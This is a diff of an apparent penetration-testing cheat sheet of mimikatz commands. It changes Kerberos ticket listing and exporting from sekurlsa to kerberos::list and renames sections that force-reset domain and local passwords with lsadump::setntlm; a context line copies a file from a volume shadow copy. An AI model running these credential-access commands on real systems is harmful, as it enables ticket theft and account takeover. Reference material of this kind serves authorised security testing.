@@ -82,12 +82,12 @@ powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShad
 
 ## tickets - list
 ```
-sekurksa::tickets
+kerberos::list
 ```
 
 ## tickets - extract 
 ```
-sekurlsa::tickets /export
+kerberos::list /export
 ```
 
 % mimikatz, dpapi, credman
@@ -182,13 +182,13 @@ ts::remote /id:<id>
 
 % mimikatz, user
 
-## change user password - Reset Domain
+## reset password - Reset Domain
 #plateform/windows #target/local #cat/CREDENTIAL-ACCESS
 ```
 lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<dc_name>
 ```
 
-## change user password - Reset Local
+## reset password - Reset Local
 #plateform/windows #target/local #cat/CREDENTIAL-ACCESS
 ```
 lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<target_name>
